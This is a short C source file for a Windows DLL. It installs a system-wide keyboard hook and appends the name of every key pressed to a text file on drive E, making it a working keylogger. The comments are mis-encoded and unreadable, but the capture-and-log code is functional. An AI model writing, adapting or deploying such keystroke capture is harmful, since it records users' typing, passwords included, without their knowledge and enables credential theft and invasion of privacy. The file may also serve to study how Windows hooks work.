#include "keydll.h"
#include <stdio.h>

//��װ����
BOOL InstallHook()
{
	g_hHook = SetWindowsHookEx(WH_KEYBOARD, KeyboardProc, GetModuleHandle(L"key"), 0);
		if (g_hHook == NULL)
			return FALSE;
		return TRUE;
}

// ж�ع���
BOOL UninstallHook()
{
	return UnhookWindowsHookEx(g_hHook);
}

// ���Ӵ�����
LRESULT CALLBACK KeyboardProc(int code, WPARAM wParam, LPARAM lParam)
{
	//���ļ�
	FILE* fp = fopen("E:\\key.txt", "a");
	if (fp == NULL)
		return CallNextHookEx(g_hHook, code, wParam, lParam);

	// ��ȡ��������
	if (code < 0 || code == HC_NOREMOVE)
		return CallNextHookEx(g_hHook, code, wParam, lParam);

	if (lParam & 0x40000000)
		return CallNextHookEx(g_hHook, code, wParam, lParam);

	char szKeyName[100] = { 0 };
	GetKeyNameTextA(lParam, szKeyName, 100);

	// д���ļ�
	fwrite(szKeyName, 1, strlen(szKeyName), fp);
	fwrite("\r\n", 1, 2, fp);

	// �ر��ļ�
	fclose(fp);


	return 0;
}